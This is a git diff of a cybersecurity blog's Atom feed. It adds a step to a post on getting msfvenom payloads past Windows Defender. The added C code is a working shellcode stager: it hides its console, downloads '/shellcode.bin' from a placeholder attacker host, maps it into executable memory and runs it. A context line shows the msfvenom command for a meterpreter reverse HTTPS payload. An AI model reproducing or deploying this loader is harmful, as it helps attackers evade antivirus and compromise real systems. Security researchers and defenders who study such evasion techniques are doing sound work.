@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-31T14:02:04-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Msfvenom Is Not Dead</title><link href="/blog/AV-Evations" rel="alternate" type="text/html" title="Msfvenom Is Not Dead" /><published>2026-01-30T00:00:00-05:00</published><updated>2026-01-30T00:00:00-05:00</updated><id>http://localhost:4000/blog/AV-Ev</id><content type="html" xml:base="/blog/AV-Evations"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-31T14:15:47-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Msfvenom Is Not Dead</title><link href="/blog/AV-Evations" rel="alternate" type="text/html" title="Msfvenom Is Not Dead" /><published>2026-01-30T00:00:00-05:00</published><updated>2026-01-30T00:00:00-05:00</updated><id>http://localhost:4000/blog/AV-Ev</id><content type="html" xml:base="/blog/AV-Evations"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>
 
 <p>So I was thinking about a different way to keep using msfvenom these days, and I found one. Today, I’m going to show you that the tool isn’t the problem the delivery method is. By taking a ‘flagged’ raw payload and wrapping it in a custom C loader with simple XOR encryption, we can bypass static analysis and pop a calculator on a fully patched system.</p>
 
@@ -133,6 +133,98 @@ msfvenom -p windows/meterpreter_reverse_https LHOST=IP LPORT=8443 -f raw &gt; sh
 </div>
 
 <h4 id="step-2">Step 2:</h4>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">C</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="Terminal">
+#include &lt;windows.h&gt;
+#include &lt;wininet.h&gt;
+#include &lt;stdio.h&gt;
+
+#pragma comment (lib, "Wininet.lib")
+
+int main() {
+
+    // 1. Hide Console
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    // 2. Setup Connection
+    HINTERNET hInternet = InternetOpen(
+        "Mozilla/5.0",
+        INTERNET_OPEN_TYPE_DIRECT,
+        NULL,
+        NULL,
+        0
+    );
+
+    HINTERNET hConnect = InternetConnect(
+        hInternet,
+        "IP-Addr",
+        80,
+        NULL,
+        NULL,
+        INTERNET_SERVICE_HTTP,
+        0,
+        0
+    );
+
+    // Flags to prevent caching
+    DWORD flags = INTERNET_FLAG_RELOAD |
+                  INTERNET_FLAG_NO_CACHE_WRITE |
+                  INTERNET_FLAG_PRAGMA_NOCACHE;
+
+    HINTERNET hRequest = HttpOpenRequest(
+        hConnect,
+        "GET",
+        "/shellcode.bin",
+        NULL,
+        NULL,
+        NULL,
+        flags,
+        0
+    );
+
+    // Send request
+    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
+        return 0;
+    }
+
+    // 3. Allocate Memory
+    char* buffer = (char*)VirtualAlloc(
+        NULL,
+        4194304, // 4 MB
+        MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    // 4. Read Response
+    DWORD bytesRead;
+    if (InternetReadFile(hRequest, buffer, 4194304, &amp;bytesRead)) {
+        if (bytesRead &gt; 0) {
+            // 5. Execute shellcode
+            int (*shellcode)() = (int(*)())buffer;
+            shellcode();
+        }
+    }
+
+    // Cleanup
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    return 0;
+}
+
+</code></pre>
+  
+</div>
 
 <div class="code-block-container">
   <span class="code-lang-tag">Terminal</span>
